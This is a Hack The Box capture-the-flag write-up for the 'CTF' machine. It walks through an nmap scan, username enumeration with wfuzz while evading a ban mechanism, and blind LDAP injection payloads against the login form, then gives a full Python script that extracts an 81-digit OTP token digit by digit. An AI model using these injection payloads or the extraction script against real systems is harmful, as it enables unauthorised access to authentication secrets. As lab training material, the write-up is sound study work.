<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - CTF | 0xRick</title>
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="Hack The Box - CTF" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="My write-up / walkthrough for CTF from Hack The Box." />
<meta property="og:description" content="My write-up / walkthrough for CTF from Hack The Box." />
<link rel="canonical" href="https://0xrick.github.io/hack-the-box/ctf/" />
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/ctf/" />
<meta property="og:site_name" content="0xRick" />
<meta property="og:image" content="https://0xrick.github.io/hackthebox/ctf/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-07-20T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"My write-up / walkthrough for CTF from Hack The Box.","@type":"BlogPosting","url":"https://0xrick.github.io/hack-the-box/ctf/","image":"https://0xrick.github.io/hackthebox/ctf/0.png","headline":"Hack The Box - CTF","dateModified":"2019-07-20T00:00:00+02:00","datePublished":"2019-07-20T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xrick.github.io/hack-the-box/ctf/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://0xrick.github.io/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
</head><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-facebook"></i></a><a class="color-purple-hover" href="https://github.com/0xRick" target="_blank" rel="noopener noreferrer"><i class="fab fa-github"></i></a><a class="color-orange-hover" href="https://www.reddit.com/user/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer"><i class="fab fa-reddit"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/332196573771595777" target="_blank" rel="noopener noreferrer"><i class="fab fa-discord"></i></a>
        <a class="color-red-hover" href="mailto:x0rick@protonmail.com"><i class="fa fa-envelope"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="author-box">
<img src="/avatar.png" class="author-avatar" onclick="window.open('https://www.hackthebox.eu/profile/65598','_blank');">
<h7>
	Ahmed Hesham<br>
	CyberSec/InfoSec enthusiast. <br>
	Interested in knowing how things work/Interested in breaking them, always learning.
</h7>
</div>

  <br>
<div>
	<h7>    Ad </h7>
	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script>
</div>
<div class="post">
  <h1 class="post-title">Hack The Box - CTF</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/linux/">linux</a>
      
      <a class="tag" href="/tag/web/">web</a>
      
      <a class="tag" href="/tag/rce/">rce</a>
      
      <a class="tag" href="/tag/php/">php</a>
      
      <a class="tag" href="/tag/ssh/">ssh</a>
      
      <a class="tag" href="/tag/python/">python</a>
      
      <a class="tag" href="/tag/exploit-development/">exploit-development</a>
      
      <a class="tag" href="/tag/ldap/">ldap</a>
      
      <a class="tag" href="/tag/code-analysis/">code-analysis</a>
      
  </div>
  
  <div class="post-date">Published on 20 Jul 2019</div>
  
  <div class="post-description">My write-up / walkthrough for CTF from Hack The Box.</div>
  
  <hr>

<h2 id="quick-summary">Quick Summary</h2>
<p><br> Hey guys today CTF retired and here’s my write-up about it. CTF was a very cool box, it had an <code class="highlighter-rouge">ldap</code> injection vulnerability which I have never seen on another box before, and the way of exploiting that vulnerability to gain access was great. A really unique box, I had fun solving it and I hope you have fun too reading my write-up. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.122</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">ctf.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/ctf/0.png" alt=""><br></p>
<hr>

<h2 id="nmap">Nmap</h2>
<p><br> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
<br><code class="highlighter-rouge">nmap -sV -sT -sC ctf.htb</code>
<br><img src="/images/hackthebox/ctf/1.png" alt=""><br>
<br> Only <code class="highlighter-rouge">http</code> on port 80 and <code class="highlighter-rouge">ssh</code> on port 22
<br></p>
<hr>

<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
<p><br><code class="highlighter-rouge">http://ctf.htb</code>
<br><img src="/images/hackthebox/ctf/2.png" alt=""><br>
<br> It’s pretty straightforward that we will get banned for 5 minutes if we tried to bruteforce anything, like sub directories for example. It’s also saying that they handle authentication with tokens, There’s a login page so let’s take a look at it.
<br><img src="/images/hackthebox/ctf/3.png" alt=""><br>
<br> We need a username and an <code class="highlighter-rouge">OTP</code> (one-time password). An <code class="highlighter-rouge">OTP</code> is time limited which means that even if we could get a valid one it will give us access only once because it expires in a short time (usually 60 seconds). So we need to gain access to a place that generates valid <code class="highlighter-rouge">OTP</code>s or to be able to generate valid <code class="highlighter-rouge">OTP</code>s ourselves. Let’s take a look at the source code of the login page, maybe something is there :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1, shrink-to-fit=no"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"description"</span> <span class="na">content=</span><span class="s">""</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"author"</span> <span class="na">content=</span><span class="s">""</span><span class="nt">&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"icon"</span> <span class="na">href=</span><span class="s">"/favicon.ico"</span><span class="nt">&gt;</span>

    <span class="nt">&lt;title&gt;</span>CTF login form<span class="nt">&lt;/title&gt;</span>

    <span class="c">&lt;!-- Bootstrap core CSS --&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/dist/css/bootstrap.min.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>

    <span class="c">&lt;!-- Custom styles for this template --&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"cover.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;/head&gt;</span>

  <span class="nt">&lt;body</span> <span class="na">class=</span><span class="s">""</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"cover-container d-flex w-100 h-100 p-3 mx-auto flex-column"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;header</span> <span class="na">class=</span><span class="s">"masthead mb-auto"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"inner"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"masthead-brand"</span><span class="nt">&gt;</span>CTF<span class="nt">&lt;/h3&gt;</span>
          <span class="nt">&lt;nav</span> <span class="na">class=</span><span class="s">"nav nav-masthead justify-content-center"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-link active"</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-link active"</span> <span class="na">href=</span><span class="s">"login.php"</span><span class="nt">&gt;</span>Login<span class="nt">&lt;/a&gt;</span>
          <span class="nt">&lt;/nav&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;/header&gt;</span>

<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/login.php"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="nt">&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"inputUsername"</span> <span class="na">class=</span><span class="s">"col-sm-2 col-form-label"</span><span class="nt">&gt;</span>Username<span class="nt">&lt;/label&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"inputUsename"</span> <span class="na">name=</span><span class="s">"inputUsername"</span> <span class="na">placeholder=</span><span class="s">"Username"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"inputOTP"</span> <span class="na">class=</span><span class="s">"col-sm-2 col-form-label"</span><span class="nt">&gt;</span>OTP<span class="nt">&lt;/label&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"OTP"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"inputOTP"</span> <span class="na">name=</span><span class="s">"inputOTP"</span> <span class="na">placeholder=</span><span class="s">"One Time Password"</span><span class="nt">&gt;</span>
      <span class="c">&lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&gt;</span>
      <span class="c">&lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) --&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"btn btn-primary  name="</span><span class="na">submit</span><span class="err">"</span> <span class="na">value=</span><span class="s">"Login"</span><span class="nt">&gt;</span>Login<span class="nt">&lt;/button&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/form&gt;</span>      
      <span class="nt">&lt;footer</span> <span class="na">class=</span><span class="s">"mastfoot mt-auto text-center"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"inner"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;p&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>CTF<span class="nt">&lt;/a&gt;</span> by <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://www.hackthebox.eu/home/users/profile/13340"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>0xEA31<span class="nt">&lt;/a&gt;</span>. Cover template for <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://getbootstrap.com/"</span><span class="nt">&gt;</span>Bootstrap<span class="nt">&lt;/a&gt;</span>, by <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://twitter.com/mdo"</span><span class="nt">&gt;</span>@mdo<span class="nt">&lt;/a&gt;</span>.<span class="nt">&lt;/p&gt;&lt;/div&gt;</span>
      <span class="nt">&lt;/footer&gt;</span>
    <span class="nt">&lt;/div&gt;</span>

    <span class="c">&lt;!-- Bootstrap core JavaScript
    ================================================== --&gt;</span>
    <span class="c">&lt;!-- Placed at the end of the document so the pages load faster --&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://code.jquery.com/jquery-3.3.1.slim.min.js"</span> <span class="na">integrity=</span><span class="s">"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"</span> <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/dist/js/bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</code></pre></div></div>
<p><br> These comments look interesting :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&gt;</span>
      <span class="c">&lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) --&gt;</span>
</code></pre></div></div>
<p><br> So now we know that they are using a token to generate the <code class="highlighter-rouge">OTP</code>s, we also know that the length of the token is 81 digits. But I still couldn’t figure out that part about the attribute they’re using to store the token. I decided to bruteforce the username then return to the <code class="highlighter-rouge">OTP</code> thing again. 
<br> I know what you’re thinking, how will I bruteforce the username without getting banned ? Well I tried to pass any credentials to see how will the application respond :
<br><img src="/images/hackthebox/ctf/4.png" alt=""><br>
<br><img src="/images/hackthebox/ctf/5.png" alt=""><br>
<br> Here I noticed 2 things. First thing is that it’s actually telling us if the user exists or not, which means that we can enumerate users. The other thing is that it responded normally with a <code class="highlighter-rouge">200 OK</code> response, so If the server identifies a bruteforce attack by monitoring how many times an ip causes errors like <code class="highlighter-rouge">404</code> for example, as long as we are not causing errors we won’t get banned. I gave it a try to see if it will actually work. I used <code class="highlighter-rouge">wfuzz</code> and <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">multiplesources-users-fabian-fingerle.de.txt</code></a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">seclists</a> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ctf# wfuzz -c -u http://ctf.htb/login.php -X POST -d "inputUsername=FUZZ&amp;inputOTP=0000" -w ./multiplesources-users-fabian-fingerle.de.txt 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://ctf.htb/login.php
Total requests: 21168

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000007:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;*("
000008:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;*()"
000010:  C=200     68 L      229 W         2810 Ch        "*****"
000002:  C=200     68 L      229 W         2810 Ch        "!@#"
000003:  C=200     68 L      229 W         2810 Ch        "!@#%"
000004:  C=200     68 L      229 W         2810 Ch        "!@#%^"
000005:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;"
000009:  C=200     68 L      233 W         2827 Ch        """"
000006:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;*"
000001:  C=200     68 L      233 W         2826 Ch        "-"
000011:  C=200     68 L      233 W         2826 Ch        "0"
000012:  C=200     68 L      233 W         2827 Ch        "00"
000021:  C=200     68 L      233 W         2835 Ch        "0123456789"
000015:  C=200     68 L      233 W         2833 Ch        "00000000"
000016:  C=200     68 L      233 W         2827 Ch        "01"
^C
Finishing pending requests...
</code></pre></div></div>
<p><br> All “user not found” responses have 233 words so I filtered them :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ctf# wfuzz -c --hw 233 -u http://ctf.htb/login.php -X POST -d "inputUsername=FUZZ&amp;inputOTP=0000" -w ./multiplesources-users-fabian-fingerle.de.txt                                  

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://ctf.htb/login.php
Total requests: 21168

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000006:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;*"
000003:  C=200     68 L      229 W         2810 Ch        "!@#%"
000004:  C=200     68 L      229 W         2810 Ch        "!@#%^"
000005:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;"
000007:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;*("
000008:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;*()"
000002:  C=200     68 L      229 W         2810 Ch        "!@#"
000010:  C=200     68 L      229 W         2810 Ch        "*****"
000065:  C=200     68 L      229 W         2810 Ch        "123456*a"
005121:  C=200     68 L      229 W         2810 Ch        "Ch4ng3m3!"
005723:  C=200     68 L      229 W         2810 Ch        "*%Cookie:"
009377:  C=200     68 L      229 W         2810 Ch        "!!Huawei"
011497:  C=200     68 L      231 W         2822 Ch        "ldapuser"
011866:  C=200     68 L      234 W         2835 Ch        "lost+found"
012611:  C=200     68 L      233 W         2831 Ch        "maurta"^C
Finishing pending requests...
</code></pre></div></div>
<p><br>  It worked and I didn’t get banned, after some time I got a result which was <code class="highlighter-rouge">ldapuser</code>, that’s weird. I also noticed that payloads that had special characters in them caused different response length. I tried <code class="highlighter-rouge">ldapuser</code> to see what’s the other message :
<br><img src="/images/hackthebox/ctf/6.png" alt=""><br>
<br><img src="/images/hackthebox/ctf/7.png" alt=""><br>
<br> It was “Cannot login”
<br> Then I tried <code class="highlighter-rouge">!@#%^&amp;*</code> and I got nothing, I just got the login page back again without any messages. I figured out that the username is being used in an <code class="highlighter-rouge">ldap</code> query, and it’s injectable (because of the special chars payloads). Also that existing attribute where the token is stored is an <code class="highlighter-rouge">ldap</code> attribute. With the injection we have we can extract the token and use it to generate valid <code class="highlighter-rouge">OTP</code>s. But because the injection is blind it will be kinda tricky to extract the token.
<br></p>
<hr>

<h2 id="ldap-injection">LDAP Injection</h2>
<p><br> As I said, it’s a blind injection which means that we won’t get any results. But a payload like this : <code class="highlighter-rouge">*)(uid=*))(|(uid=*</code>  should result in “Cannot login”. However when I tried it I didn’t get any message, So I tried to URL encode the payload and it worked. So the injection works when the payload is double URL encoded (I only encoded the payload once because the browser automatically encodes POST data). I switched to burp, here are the results :
<br> Request :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/login.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">ctf.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://ctf.htb/login.php</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">190</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=sqmpanb3d1uui0pf4uafubv010</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>

inputUsername=%25%32%61%25%32%39%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61%25%32%39%25%32%39%25%32%38%25%37%63%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61&amp;inputOTP=0000
</code></pre></div></div>
<p><br> Response :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 19 Jul 2019 17:58:29 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16</span>
<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/5.4.16</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">2822</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>

<span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
	---------
	 Removed
	---------
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
    Cannot login    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
	---------
	 Removed
	---------
</code></pre></div></div>
<p><br> Now we need to know which attribute the token is stored in. We know it’s an existing attribute so we just need to choose the right one. I checked <a href="https://docs.bmc.com/docs/fpsc121/ldap-attributes-and-associated-fields-495323340.html" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">ldap</code> attributes</a> and chose some of them to test (<code class="highlighter-rouge">comment</code>, <code class="highlighter-rouge">pager</code> and <code class="highlighter-rouge">info</code>), the payload will be like this : <code class="highlighter-rouge">*)(uid=*))(|(ATTRIBUTE=*</code> (instead of the second <code class="highlighter-rouge">uid</code> attribute we will use the attribute we are testing). We also know that the token is numeric so we can remove <code class="highlighter-rouge">*</code> and replace it with numeric values from 0 to 9 and monitor the responses (I used burp intruder to do this). So the final payload will be like this : <code class="highlighter-rouge">*)(uid=*))(|(ATTRIBUTE=N</code>. After some testing this payload with the attribute <code class="highlighter-rouge">pager</code> and value of 2 : <code class="highlighter-rouge">*)(uid=*))(|(pager=2</code> resulted in “Cannot login” message. Great so our payload will be <code class="highlighter-rouge">*)(uid=*))(|(pager=2N</code> and we will bruteforce the second number again until we get “Cannot login”. We will keep repeating this until we reach the 81st number, but doing this manually is lame and boring so I wrote a python script.
<br></p>
<hr>

<h2 id="exploitation-token-extraction">Exploitation, Token Extraction</h2>
<p><br> I created 3 functions :</p>
<ul>
  <li>
<br> <code class="highlighter-rouge">send_payload</code>  (to send the injection payload and receive the response)</li>
  <li>
<br> <code class="highlighter-rouge">check_response</code> (to check whether the response contains “Cannot login” or not)</li>
  <li>
<br> <code class="highlighter-rouge">exploit</code> : This function creates a list of numbers from 0 to 9, then by looping through that list it creates the payload which is : <code class="highlighter-rouge">%2A%29%28uid%3D%2A%29%29%28%7C%28pager%3D</code> + token + number + <code class="highlighter-rouge">%2A</code> (encoded only once because python requests automatically encodes POST data). Then it calls <code class="highlighter-rouge">send_payload</code> and <code class="highlighter-rouge">check_response</code>, if <code class="highlighter-rouge">check_response</code> returned <code class="highlighter-rouge">True</code> it adds the valid number to the token.</li>
</ul>

<p><br></p>

<p><br> Then I wrote a <code class="highlighter-rouge">while</code> loop to keep calling <code class="highlighter-rouge">exploit()</code> as long as <code class="highlighter-rouge">len(token)</code> is not 81 
<br>
<br> <code class="highlighter-rouge">extract_token.py</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">YELLOW</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[93m"</span>
<span class="n">GREEN</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m"</span>

<span class="k">def</span> <span class="nf">send_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
	<span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"inputUsername"</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span><span class="s">"inputOTP"</span><span class="p">:</span><span class="s">"0000"</span><span class="p">}</span>
	<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://10.10.10.122/login.php"</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
	<span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
	<span class="k">return</span> <span class="n">response</span>

<span class="k">def</span> <span class="nf">check_response</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
	<span class="k">if</span> <span class="s">"Cannot login"</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
		<span class="k">return</span> <span class="bp">True</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">token</span>
	<span class="n">n_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">n</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">)]</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">n_list</span><span class="p">:</span>
		<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%2</span><span class="s">A</span><span class="si">%29%28</span><span class="s">uid</span><span class="si">%3</span><span class="s">D</span><span class="si">%2</span><span class="s">A</span><span class="si">%29%29%28%7</span><span class="s">C</span><span class="si">%28</span><span class="s">pager</span><span class="si">%3</span><span class="s">D{}{}</span><span class="si">%2</span><span class="s">A"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
		<span class="n">response</span> <span class="o">=</span> <span class="n">send_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">check_response</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
			<span class="n">token</span><span class="o">+=</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">token</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[*] Extracting Token"</span><span class="p">)</span>
<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">81</span><span class="p">:</span>
	<span class="n">exploit</span><span class="p">()</span>
	<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span> <span class="o">+</span> <span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[*] Status : "</span> <span class="o">+</span> <span class="n">token</span><span class="p">)</span>
	<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
<span class="k">else</span> <span class="p">:</span>
	<span class="k">print</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">[!] Done !"</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[*] Token : "</span> <span class="o">+</span> <span class="n">token</span><span class="p">)</span>
</code></pre></div></div>
<p><br>
<br><img src="/images/hackthebox/ctf/8.gif" alt=""><br>
<br> It took some minutes to finish and now we have the token :
<br><img src="/images/hackthebox/ctf/9.png" alt=""><br></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>285449490011357156531651545652335570713167411445727140604172141456711102716717000
</code></pre></div></div>
